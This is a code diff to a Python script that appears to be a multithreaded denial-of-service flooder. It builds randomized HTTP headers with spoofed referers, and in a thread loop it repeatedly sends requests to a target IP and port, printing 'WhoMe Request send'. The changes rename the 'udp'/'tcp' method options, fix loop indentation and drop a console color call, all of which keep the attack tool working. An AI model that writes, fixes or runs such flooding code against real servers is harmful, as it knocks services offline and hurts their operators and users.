@@ -173,6 +173,7 @@ referers = [
 'http://eu.battle.net/wow/en/search?q=']
 
 
+
 os.system("Color 01")
 print("…………..$……………………………………..$………….")
 print("…………$$……………………………………..$$…………")
@@ -302,7 +303,7 @@ def attack():
     
 def Headers(method):
     header = ""
-    if method == "1" or method == "2":
+    if method == "udp" or method == "tcp":
         connection = "Connection: Keep-Alive\r\n"
         accept = random.choice(acceptall) + "\r\n"
         content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
@@ -347,13 +348,12 @@ def run():
                 s.send(str.encode(request))
                 s.sendall(str.encode(request))
                 s.sendall(str.encode(request))
-            os.system("colora 09")
             print(f"WhoMe Request send => {ip} With Port => {port}")
         except :
             print(f"WhoMe Request send => {ip} With Port => {port}")
             s.close()
-            
- for y in range(threads):
+
+for y in range(threads):
     th = threading.Thread(target = run)
     th.start()
 
